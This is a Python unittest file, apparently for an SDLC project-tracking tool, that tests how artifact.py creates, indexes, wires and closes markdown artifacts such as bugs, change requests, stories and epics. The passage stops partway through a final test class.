"""Unit tests for artifact.py - deterministic create + close cascade (CR0045)."""
from __future__ import annotations

import importlib.util
import sys
import tempfile
import unittest
from pathlib import Path

SCR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(SCR))
sys.path.insert(0, str(Path(__file__).resolve().parent))  # tests/ dir, for the gitutil helper
from lib import sdlc_md  # noqa: E402
import validate  # noqa: E402
import reconcile  # noqa: E402


def _load():
    spec = importlib.util.spec_from_file_location("artifact", SCR / "artifact.py")
    mod = importlib.util.module_from_spec(spec)
    sys.modules["artifact"] = mod
    spec.loader.exec_module(mod)
    return mod


artifact = _load()

# A bug and a CR may not be born UNGROOMED: both creators refuse a unit `sprint plan` could not
# plan - one naming neither the files it touches nor a size (BG0136). The prose of a scaffold may
# still be deferred to whoever fills it in; the grooming may not.
GROOM = {"affects": "src/thing.py", "points": 3}
GROOM_CLI = ["--affects", "src/thing.py", "--points", "3"]
# A CR/RFC/epic is a REQUEST: it carries a T-shirt Size (S/M/L/XL), never delivery Points (BG0148).
GROOM_REQUEST = {"affects": "src/thing.py", "size": "M"}
GROOM_REQUEST_CLI = ["--affects", "src/thing.py", "--size", "M"]

# BG0144: the grooming gate now REFUSES a bug/CR whose declared `Affects` paths all fail to
# resolve on disk. Every groomed fixture that EXPECTS to be created must therefore have its
# declared path exist. Materialise the superset of paths any groomed fixture declares
# (GROOM* -> src/thing.py, the inline plannable fixtures -> src/a.py, src/b.py, src/gate.py) at
# each success site; deliberate-refusal fixtures declare no path (or a broken one) and are left alone.
_GROOM_PATHS = ("src/thing.py", "src/a.py", "src/b.py", "src/gate.py")


def _affect(root: Path, rel: str) -> None:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text("", encoding="utf-8")


def _groom_stubs(root: Path) -> None:
    for rel in _GROOM_PATHS:
        _affect(root, rel)


def _index(repo: Path, type_: str, header: str) -> None:
    _groom_stubs(repo)  # BG0144: make declared Affects paths real so groomed creates resolve
    d = repo / sdlc_md.ARTIFACT_TYPES[type_][0]
    d.mkdir(parents=True, exist_ok=True)
    ncols = header.count("|") - 1
    sep = "| " + " | ".join(["---"] * ncols) + " |"
    (d / "_index.md").write_text(
        "# Index\n\n## Summary\n\n| Status | Count |\n| --- | --- |\n"
        "| Draft | 0 |\n| Proposed | 0 |\n| Open | 0 |\n| **Total** | **0** |\n\n"
        "## All\n\n" + header + "\n" + sep + "\n", encoding="utf-8")


def _epic(repo: Path, disp: str = "EP0001") -> None:
    d = repo / "sdlc-studio" / "epics"
    d.mkdir(parents=True, exist_ok=True)
    (d / f"{disp}-x.md").write_text(
        f"# {disp}: x\n\n> **Status:** Draft\n\n## Story Breakdown\n\n_No stories yet._\n\n"
        "## Revision History\n\n| Date | Author | Change |\n| --- | --- | --- |\n", encoding="utf-8")


def _v3(repo: Path) -> None:
    """Opt the fixture project into schema v3 (ULID ids)."""
    cfg = repo / "sdlc-studio"
    cfg.mkdir(parents=True, exist_ok=True)
    (cfg / ".config.yaml").write_text("schema_version: 3\n", encoding="utf-8")


class SchemaV3AllocationTests(unittest.TestCase):
    """US0055/RFC0024: a schema-v3 project mints ULID ids; v2 stays sequential."""

    def test_v3_mints_ulid_id(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _v3(repo)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            r = artifact.new(repo, "bug", "a defect", dict(GROOM))
            self.assertRegex(r["id"], r"^BG-[0-9A-HJKMNP-TV-Z]{8,}$")
            self.assertEqual(r["id"], r["file_id"])   # v3: one canonical form
            self.assertTrue(r["indexed"])
            self.assertTrue(Path(r["path"]).exists())

    def test_v3_two_allocations_distinct(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _v3(repo)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            a = artifact.new(repo, "bug", "one", dict(GROOM))
            b = artifact.new(repo, "bug", "two", dict(GROOM))
            self.assertNotEqual(a["id"], b["id"])
            self.assertEqual(reconcile.detect_type("bug", repo)["drift"], [])

    def test_v2_default_stays_sequential(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            r = artifact.new(repo, "cr", "change", dict(GROOM_REQUEST))
            self.assertEqual(r["id"], "CR-0001")   # no .config.yaml -> v2 sequential

    def test_v3_findings_file_into_inbox(self) -> None:
        # US0065: under v3 a filed finding lands in `inbox` (file body + index row),
        # not the per-type create status.
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _v3(repo)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            r = artifact.new(repo, "bug", "a defect", dict(GROOM))
            self.assertIn("> **Status:** inbox", Path(r["path"]).read_text(encoding="utf-8"))
            idx = (repo / "sdlc-studio" / "bugs" / "_index.md").read_text(encoding="utf-8")
            self.assertIn("| inbox |", idx)
            self.assertEqual(reconcile.detect_type("bug", repo)["drift"], [])

    def test_v2_findings_keep_create_status(self) -> None:
        # No schema_version:3 -> a bug still files Open (era-gating leaves v2 untouched).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            r = artifact.new(repo, "bug", "a defect", dict(GROOM))
            self.assertIn("> **Status:** Open", Path(r["path"]).read_text(encoding="utf-8"))


class BatchWiringCleanTests(unittest.TestCase):
    """US0081/CR0166: batch epic-wiring is structurally clean - no stray separator, the
    Story Breakdown is populated, and the epic section has no orphaned/empty table."""

    def test_two_epic_batch_wires_cleanly(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo, "EP0001")
            _epic(repo, "EP0002")
            artifact.new_batch(repo, "story", [
                {"title": "one", "epic": "EP0001"}, {"title": "two", "epic": "EP0001"},
                {"title": "three", "epic": "EP0002"}, {"title": "four", "epic": "EP0002"}],
                template="minimal")
            for ep, n in (("EP0001", 2), ("EP0002", 2)):
                text = (repo / "sdlc-studio" / "epics" / f"{ep}-x.md").read_text(encoding="utf-8")
                self.assertNotIn("_No stories yet._", text)      # placeholder replaced
                self.assertNotIn("\n---\n", text)                 # no stray separator
                sb = text[text.index("## Story Breakdown"):]
                sb = sb[:sb.index("## Revision")] if "## Revision" in sb else sb
                self.assertEqual(sb.count("- [ ] ["), n)          # exactly n linked stories, no empty rows


class NewTests(unittest.TestCase):
    def test_new_story_creates_wires_validates(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "do a thing", {"epic": "EP0001"})
            self.assertTrue(r["indexed"])
            self.assertTrue(r["epic_linked"])
            p = Path(r["path"])
            self.assertTrue(p.exists())
            # file validates clean (no error-severity violations)
            errs = [v for v in validate.validate_file(p, "story", repo)
                    if v["severity"] == "error" and v["rule"] != "placeholder"]
            self.assertEqual(errs, [])
            # epic breakdown now references the story; placeholder gone
            ep = (repo / "sdlc-studio" / "epics" / "EP0001-x.md").read_text()
            self.assertIn(r["id"], ep)
            self.assertNotIn("_No stories yet._", ep)
            # the type's index has 0 drift
            self.assertEqual(reconcile.detect_type("story", repo)["drift"], [])

    def test_new_cr_uses_dash_disp(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            r = artifact.new(repo, "cr", "change something", dict(GROOM_REQUEST))
            self.assertTrue(r["id"].startswith("CR-"))   # dash form
            self.assertTrue(r["file_id"].startswith("CR") and "-" not in r["file_id"])
            self.assertTrue(r["indexed"])

    def test_all_types_scaffold_validates(self) -> None:
        for t in artifact.SPEC:
            with tempfile.TemporaryDirectory() as d:
                repo = Path(d)
                (repo / "sdlc-studio").mkdir(parents=True)
                _groom_stubs(repo)  # BG0144: groomed types (bug/cr) need their Affects path real
                if t == "story":
                    _epic(repo)  # a story needs an existing parent epic (BG0022)
                fields = {"epic": "EP0001"} if t == "story" else {}
                if t == "bug":
                    fields.update(GROOM)  # a delivery unit is groomed with Points
                elif t == "cr":
                    fields.update(GROOM_REQUEST)  # a request is groomed with a T-shirt Size
                r = artifact.new(repo, t, f"a {t}", fields)
                p = Path(r["path"])
                errs = [v for v in validate.validate_file(p, t, repo)
                        if v["severity"] == "error" and v["rule"] != "placeholder"]
                self.assertEqual(errs, [], f"{t} scaffold has validate errors: {errs}")

    def test_story_requires_epic(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            with self.assertRaises(ValueError):
                artifact.new(Path(d), "story", "no epic given")

    def test_row_matches_index_header_width(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            hdr = "| ID | Title | Status | Priority | Type | Date | Linked Epics |"
            _index(repo, "cr", hdr)
            artifact.new(repo, "cr", "widthcheck", dict(GROOM_REQUEST))
            idx = (repo / "sdlc-studio" / "change-requests" / "_index.md").read_text()
            row = next(l for l in idx.splitlines() if l.strip().startswith("| [CR-"))
            self.assertEqual(len(reconcile._table_cells(row)), hdr.count("|") - 1)


    def test_loose_epic_id_does_not_wire_wrong_epic(self) -> None:
        # HIGH regression: a loose id must not substring-match a padded epic. EP001 is absent
        # (only EP0010 exists), so it must RAISE rather than orphan the story (BG0022).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo, "EP0010")
            with self.assertRaises(ValueError):
                artifact.new(repo, "story", "loose ref", {"epic": "EP001"})  # not EP0010
            self.assertNotIn("loose ref", (repo / "sdlc-studio" / "epics" / "EP0010-x.md").read_text())

    def test_absent_epic_raises_no_orphan_file(self) -> None:
        # BG0022: a story for a non-existent epic must raise BEFORE writing any file.
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            with self.assertRaises(ValueError):
                artifact.new(repo, "story", "orphan", {"epic": "EP9999"})
            self.assertEqual(list((repo / "sdlc-studio" / "stories").glob("US*.md")), [])

    def test_allocation_skips_lingering_index_row(self) -> None:
        # BG0022: an id whose file was deleted but whose index row remains must not be
        # re-issued (file census alone would re-use it).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _groom_stubs(repo)  # BG0144: GROOM_REQUEST declares src/thing.py
            sd = repo / "sdlc-studio" / "change-requests"; sd.mkdir(parents=True)
            (sd / "_index.md").write_text(
                "# Index\n\n## All\n\n| ID | Title | Status | Priority | Type | Date | Linked Epics |\n"
                "| --- | --- | --- | --- | --- | --- | --- |\n"
                "| [CR-0005](CR0005-x.md) | gone | Done | Medium | Feature | 2026-01-01 | - |\n",
                encoding="utf-8")  # row present, file absent
            r = artifact.new(repo, "cr", "fresh", dict(GROOM_REQUEST))
            self.assertEqual(r["file_id"], "CR0006")  # above the lingering CR0005 row, not CR0001

    def test_pipe_in_title_escaped_in_row(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            artifact.new(repo, "cr", "a | b piped", dict(GROOM_REQUEST))
            idx = (repo / "sdlc-studio" / "change-requests" / "_index.md").read_text()
            row = next(l for l in idx.splitlines() if l.strip().startswith("| [CR-"))
            cells = reconcile._table_cells(row)
            self.assertIn("a | b piped", cells)  # round-trips, column count intact
            self.assertEqual(len(cells), 7)

    def test_index_absent_is_created_then_indexed(self) -> None:
        # CR0077: a missing index is created from the template, then the row appended
        # (was: indexed=False on the greenfield first run, the misleading signal).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            (repo / "sdlc-studio").mkdir(parents=True)
            _groom_stubs(repo)  # BG0144: GROOM declares src/thing.py
            r = artifact.new(repo, "bug", "no index here", dict(GROOM))
            self.assertTrue(r["index_created"])
            self.assertTrue(r["indexed"])
            self.assertTrue(Path(r["path"]).exists())

    def test_wiring_keeps_blank_before_next_heading(self) -> None:
        # Regression: inserting an item must not orphan it against the next heading (MD032/MD022).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            ep = repo / "sdlc-studio" / "epics" / "EP0001-x.md"
            ep.parent.mkdir(parents=True)
            ep.write_text("# EP0001: x\n\n> **Status:** Draft\n\n## Story Breakdown\n\n"
                          "- [x] [US0009: a](../stories/US0009-a.md)\n## Revision History\n\n", encoding="utf-8")
            artifact.new(repo, "story", "wired", {"epic": "EP0001"})
            out = ep.read_text().splitlines()
            h = out.index("## Revision History")
            self.assertEqual(out[h - 1].strip(), "")           # blank line before the heading
            self.assertTrue(out[h - 2].strip().startswith("- ["))  # last list item precedes the blank


    def test_wiring_preserves_prose_and_internal_blanks(self) -> None:
        # Regression (CR0053): a breakdown with prose + a list must keep its internal blank
        # lines on wire (a full rebuild collapsed them -> MD032).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            ep = repo / "sdlc-studio" / "epics" / "EP0001-x.md"
            ep.parent.mkdir(parents=True)
            ep.write_text("# EP0001: x\n\n> **Status:** Draft\n\n## Story Breakdown\n\n"
                          "Phase 1 delivered:\n\n- [x] [US0009: a](../stories/US0009-a.md)\n\n"
                          "## Revision History\n\n", encoding="utf-8")
            artifact.new(repo, "story", "wired2", {"epic": "EP0001"})
            out = ep.read_text()
            self.assertIn("Phase 1 delivered:\n\n- [x]", out)   # prose->list blank preserved
            lines = out.splitlines()
            h = lines.index("## Revision History")
            self.assertEqual(lines[h - 1].strip(), "")            # blank before next heading

    def test_epic_without_breakdown_link_false(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            (repo / "sdlc-studio" / "epics").mkdir(parents=True)
            (repo / "sdlc-studio" / "epics" / "EP0001-x.md").write_text(
                "# EP0001: x\n\n> **Status:** Draft\n\n## Summary\n\nno breakdown section\n", encoding="utf-8")
            r = artifact.new(repo, "story", "s", {"epic": "EP0001"})
            self.assertFalse(r["epic_linked"])  # no crash, just not wired


    def test_wiring_disp_substring_not_falsely_idempotent(self) -> None:
        # HIGH regression: US0001 must wire even when US00012 is already listed (the old
        # `disp in text` substring check silently dropped it).
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            ep = repo / "sdlc-studio" / "epics" / "EP0001-x.md"
            ep.parent.mkdir(parents=True)
            ep.write_text("# EP0001: x\n\n> **Status:** Draft\n\n## Story Breakdown\n\n"
                          "- [x] [US00012: big](../stories/US00012-big.md)\n\n## Revision History\n\n",
                          encoding="utf-8")
            r = artifact.new(repo, "story", "small", {"epic": "EP0001"})
            self.assertEqual(r["id"], "US0001")
            self.assertTrue(r["epic_linked"])
            self.assertIn("[US0001:", ep.read_text())  # actually inserted, not falsely skipped


    def test_new_dry_run_writes_nothing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
            idx = repo / "sdlc-studio" / "change-requests" / "_index.md"
            before = idx.read_text()
            r = artifact.new(repo, "cr", "preview", dict(GROOM_REQUEST), dry_run=True)
            self.assertTrue(r["dry_run"])
            self.assertFalse(Path(r["path"]).exists())
            self.assertEqual(idx.read_text(), before)

    @staticmethod
    def _drop_executable_acs(path: Path) -> None:
        """Remove the template's seeded `Verify:` line so the AC-verify gate has nothing to hold.

        Needed since BG0214: `close(dry_run=True)` now runs the real gate ladder, and the story
        scaffold declares an (unverified) executable AC. These fixtures previously passed only
        because the preview consulted no gate at all.
        """
        p = Path(path)
        p.write_text("\n".join(ln for ln in p.read_text(encoding="utf-8").splitlines()
                               if "**Verify:**" not in ln) + "\n", encoding="utf-8")

    def test_close_dry_run_does_not_transition(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "to keep open", {"epic": "EP0001"})
            self._drop_executable_acs(r["path"])
            before = Path(r["path"]).read_text()
            import telemetry
            res = artifact.close(repo, r["id"], dry_run=True)
            self.assertTrue(res["dry_run"])
            self.assertEqual(Path(r["path"]).read_text(), before)  # status unchanged
            self.assertEqual(telemetry.read_all(repo), [])         # no telemetry recorded

    def test_close_dry_run_refuses_exactly_what_the_real_close_refuses(self) -> None:
        """BG0214: the preview must consult the same gates the run does.

        `close(dry_run=True)` used to synthesise its answer and return before `transition` was
        ever called, so it reported `would close` for a story the real close refused, and exited
        0 where the real path exits 1. The test above cannot catch that: its story has a clean
        gate ladder, so it passes whether the preview is honest or not. This one uses a story
        the AC-verify gate REFUSES - the discriminating fixture.
        """
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "has an executable AC", {"epic": "EP0001"})
            p = Path(r["path"])
            # An executable AC with no verify-report entry: `transition -> Done` blocks on it.
            p.write_text(p.read_text() + "\n### AC1: it works\n\n- **Verify:** shell true\n",
                         encoding="utf-8")
            before = p.read_text()

            with self.assertRaises(ValueError) as dry:
                artifact.close(repo, r["id"], dry_run=True)
            with self.assertRaises(ValueError) as real:
                artifact.close(repo, r["id"])
            # Same refusal, not merely both raising.
            self.assertEqual(str(dry.exception), str(real.exception))
            self.assertIn("never verified", str(dry.exception))
            self.assertEqual(p.read_text(), before)   # and the preview still wrote nothing

    def test_orchestrated_close_dry_run_accounts_for_the_annotation_it_would_write(self) -> None:
        """The other direction of the same divergence, introduced by the BG0214 fix.

        `cmd_close` annotates `Verification depth` and only THEN transitions, but guards the
        annotation with `if not args.dry_run`. So the preview judged the un-annotated file and
        REFUSED what the real command accepts - preview and run disagreeing again, opposite way
        round. The first version of this suite hid it: a test called `transition.annotate` by
        hand before the dry run, so the workaround shipped and the defect went unnoticed.

        Driven through `main`, because the defect is in the CLI's ordering, not in `close`.
        """
        import io as _io                                   # noqa: PLC0415 - imported below in
        import contextlib as _ctx                          # noqa: PLC0415 - this module
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            _v3(repo)
            r = artifact.new(repo, "bug", "depth probe", dict(GROOM))
            argv = ["close", "--id", r["id"], "--depth", "functional",
                    "--triaged-by", "T; agent; v1", "--root", str(repo)]
            with _ctx.redirect_stdout(_io.StringIO()), _ctx.redirect_stderr(_io.StringIO()):
                dry = artifact.main([*argv, "--dry-run"])
                real = artifact.main(argv)
            self.assertEqual((dry, real), (0, 0),
                             "the preview and the real orchestrated close disagree")

    def test_close_dry_run_still_previews_what_the_gates_allow(self) -> None:
        """The counterpart: the fix must not turn every preview into a refusal."""
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "no executable acs", {"epic": "EP0001"})
            self._drop_executable_acs(r["path"])
            res = artifact.close(repo, r["id"], dry_run=True)
            self.assertTrue(res["dry_run"])
            self.assertEqual(res["to"], "Done")


class CloseTests(unittest.TestCase):
    def test_close_unknown_prefix_raises(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            with self.assertRaises(ValueError):
                artifact.close(Path(d), "ZZ0001")

    def test_close_records_telemetry_event(self) -> None:
        import telemetry
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "tel close", {"epic": "EP0001"})
            artifact.close(repo, r["id"], metrics={"iterations": 2, "critic_verdict": "approve"},
                           force=True)  # CR0084 gate bypassed: testing the close cascade
            recs = telemetry.read_all(repo)
            self.assertEqual(recs[-1]["id"], r["id"])
            self.assertEqual(recs[-1]["type"], "story")
            self.assertEqual(recs[-1]["iterations"], 2)
            self.assertEqual(recs[-1]["critic_verdict"], "approve")

    def test_close_transitions_to_terminal(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "to be closed", {"epic": "EP0001"})
            artifact.close(repo, r["id"], force=True)  # default terminal = Done (gate bypassed)
            self.assertIn("Done", Path(r["path"]).read_text())


class LazyIndexTests(unittest.TestCase):
    """CR0077 Item 1: `new` creates a missing index from templates/indexes/ on first use."""

    def test_first_artifact_creates_index_and_indexes(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)  # no _index.md anywhere - the greenfield first run
            r = artifact.new(repo, "epic", "platform foundation")
            self.assertTrue(r["index_created"], "should create the missing index")
            self.assertTrue(r["indexed"], "and append the row to it")
            idx = repo / "sdlc-studio" / "epics" / "_index.md"
            self.assertTrue(idx.exists())
            text = idx.read_text(encoding="utf-8")
            self.assertIn(r["id"], text)            # the row landed
            self.assertNotIn("{{", text)            # no leftover template placeholders

    def test_index_creation_is_idempotent(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            first = artifact.new(repo, "epic", "one")
            second = artifact.new(repo, "epic", "two")
            self.assertTrue(first["index_created"])
            self.assertFalse(second["index_created"], "must not recreate an existing index")
            self.assertTrue(second["indexed"])
            text = (repo / "sdlc-studio" / "epics" / "_index.md").read_text()
            self.assertIn(first["id"], text)
            self.assertIn(second["id"], text)       # both rows present

    def test_dry_run_reports_would_create_index_without_writing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            r = artifact.new(repo, "epic", "preview", dry_run=True)
            self.assertTrue(r["would_create_index"])
            self.assertTrue(r["indexed"])
            self.assertFalse((repo / "sdlc-studio" / "epics" / "_index.md").exists())
            self.assertFalse(Path(r["path"]).exists())


class BatchTests(unittest.TestCase):
    """CR0078: many artifacts of one type in one atomic, contiguous-id pass."""

    def test_batch_creates_wires_and_keeps_drift_zero(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            items = [{"title": "rest conventions", "epic": "EP0001"},
                     {"title": "auth middleware", "epic": "EP0001"},
                     {"title": "persistence", "epic": "EP0001"}]
            r = artifact.new_batch(repo, "story", items)
            self.assertEqual(r["count"], 3)
            ids = [c["id"] for c in r["created"]]
            self.assertEqual(ids, ["US0001", "US0002", "US0003"])  # contiguous block
            ep = (repo / "sdlc-studio" / "epics" / "EP0001-x.md").read_text()
            for i in ids:
                self.assertIn(i, ep)                               # each wired to the epic
            self.assertEqual(reconcile.detect_type("story", repo)["drift"], [])  # counts in sync

    def test_batch_defaults_to_full_template(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new_batch(repo, "story", [{"title": "x", "epic": "EP0001"}])
            self.assertEqual(r["template"], "full")
            self.assertIn("## Context", Path(r["created"][0]["path"]).read_text())  # rich body

    def test_batch_is_atomic_on_bad_epic(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            items = [{"title": "good", "epic": "EP0001"}, {"title": "bad", "epic": "EP9999"}]
            with self.assertRaises(ValueError):
                artifact.new_batch(repo, "story", items)
            self.assertEqual(list((repo / "sdlc-studio" / "stories").glob("US*.md")), [])

    def test_batch_dry_run_writes_nothing(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new_batch(repo, "story", [{"title": "x", "epic": "EP0001"}], dry_run=True)
            self.assertTrue(r["dry_run"])
            self.assertEqual(r["ids"][0]["id"], "US0001")
            self.assertEqual(list((repo / "sdlc-studio" / "stories").glob("US*.md")), [])


class FullTemplateTests(unittest.TestCase):
    """CR0077 Item 2: `--template full` grafts the rich core body onto the provenance head."""

    def test_full_epic_has_rich_sections_and_provenance(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            r = artifact.new(repo, "epic", "rich epic", {"template": "full"})
            text = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("**Created-by:** sdlc-studio new", text)   # provenance head intact
            self.assertIn("## Inherited Constraints", text)      # a section only the full body has
            self.assertTrue(text.startswith(f"# {r['id']}: rich epic"))
            errs = [v for v in validate.validate_file(Path(r["path"]), "epic", repo)
                    if v["severity"] == "error" and v["rule"] != "placeholder"]
            self.assertEqual(errs, [], f"full scaffold should validate clean: {errs}")

    def test_minimal_is_default_and_lean(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            r = artifact.new(repo, "epic", "lean epic")  # no template -> minimal
            text = Path(r["path"]).read_text(encoding="utf-8")
            self.assertNotIn("## Inherited Constraints", text)   # minimal stays terse
            self.assertIn("**Created-by:** sdlc-studio new", text)


class SubsectionPreservationTests(unittest.TestCase):
    """BG0113: a supplied field replaces a section's prose body but keeps the template's
    `###` subsection scaffold prompts beneath the `##` heading, so an agent filling the
    artefact keeps the guidance rather than losing it."""

    def test_fix_keeps_files_modified_and_tests_added_prompts(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _groom_stubs(repo)  # BG0144: GROOM declares src/thing.py
            r = artifact.new(repo, "bug", "dropped subsection",
                             {**GROOM, "template": "full", "fix": "swap the greedy regex"})
            text = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("swap the greedy regex", text)       # supplied prose landed
            self.assertIn("### Files Modified", text)           # scaffold prompt preserved
            self.assertIn("### Tests Added", text)

    def test_put_section_preserves_subsections(self) -> None:
        body = ("## Proposed Fix\n\n> *hint*\n\n{{fix_description}}\n\n"
                "### Files Modified\n\n| File | Change |\n| --- | --- |\n\n"
                "## Revision History\n\n| Date | Author | Change |\n")
        out = artifact._put_section(body, ("Proposed Fix", "Fix"), "the actual fix\n")
        self.assertIn("the actual fix", out)
        self.assertIn("### Files Modified", out)
        self.assertNotIn("{{fix_description}}", out)   # prose body replaced
        self.assertIn("## Revision History", out)       # next ## untouched


class ProjectTemplateTests(unittest.TestCase):
    """RFC-0023 write path: `new` scaffolds the project's declared template
    (conventions.templates.<type>) so the scaffold matches the house shape the
    read-side checks expect - the skill default stays the fallback."""

    HOUSE = ("<!-- house bug template -->\n\n# {{id}}: {{title}}\n\n"
             "## Symptom\n\n{{symptom}}\n\n## Root cause\n\n{{cause}}\n\n"
             "## Fix (proposed)\n\n{{fix}}\n\n## Verify\n\n{{verify}}\n")

    def _repo(self, d, declare=True, write_template=True):
        repo = Path(d)
        _groom_stubs(repo)  # BG0144: GROOM declares src/thing.py
        (repo / "sdlc-studio" / "templates").mkdir(parents=True)
        if write_template:
            (repo / "sdlc-studio" / "templates" / "bug.md").write_text(
                self.HOUSE, encoding="utf-8")
        if declare:
            (repo / "sdlc-studio" / ".config.yaml").write_text(
                "conventions:\n  templates:\n    bug: sdlc-studio/templates/bug.md\n",
                encoding="utf-8")
        return repo

    def _yaml(self):
        try:
            import yaml  # noqa: F401
        except ImportError:
            self.skipTest("PyYAML absent - conventions degrade to defaults")

    def test_declared_template_shapes_the_scaffold(self) -> None:
        self._yaml()
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d)
            r = artifact.new(repo, "bug", "wrong colour", dict(GROOM))
            text = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("**Created-by:** sdlc-studio new", text)  # provenance head intact
            self.assertIn("## Symptom", text)                        # house body grafted
            self.assertIn("## Fix (proposed)", text)
            self.assertNotIn("## Steps to Reproduce", text)          # skill body replaced

    def test_undeclared_project_uses_skill_default(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d, declare=False)
            r = artifact.new(repo, "bug", "wrong colour", dict(GROOM))
            text = Path(r["path"]).read_text(encoding="utf-8")
            self.assertIn("## Steps to Reproduce", text)             # v3.4.0 behaviour

    def test_declared_but_missing_template_fails_loud(self) -> None:
        self._yaml()
        with tempfile.TemporaryDirectory() as d:
            repo = self._repo(d, write_template=False)
            from lib import conventions
            with self.assertRaises(conventions.ConventionsError):
                artifact.new(repo, "bug", "wrong colour", dict(GROOM))


class MetaTypeTests(unittest.TestCase):
    """CR0143: retro and review are tool-created (id + file + index row), the last
    hand-authored artifact class retired."""

    def test_new_retro_creates_file_and_index_row(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            rd = root / "sdlc-studio" / "retros"
            rd.mkdir(parents=True)
            (rd / "_index.md").write_text(
                "# Retro Index\n\n| ID | Sprint | Date | Delivered | Blocked |\n"
                "| --- | --- | --- | --- | --- |\n", encoding="utf-8")
            res = artifact.meta_new(root, "retro", "Sprint close retro")
            self.assertTrue(res["id"].startswith("RETRO-"))
            body = Path(res["path"]).read_text(encoding="utf-8")
            self.assertIn("Sprint close retro", body)
            self.assertNotIn("{{retro_id}}", body)           # id/title/date filled
            idx = (rd / "_index.md").read_text(encoding="utf-8")
            self.assertIn(res["id"], idx)
            self.assertTrue(res["indexed"])

    def test_new_review_without_index_bootstraps_and_indexes(self) -> None:
        # BG0116: a review created before any index used to report indexed=False and leave a
        # missing-index reconcile drift item. meta_new now bootstraps the index on first use,
        # so the file is created AND indexed.
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "sdlc-studio" / "reviews").mkdir(parents=True)
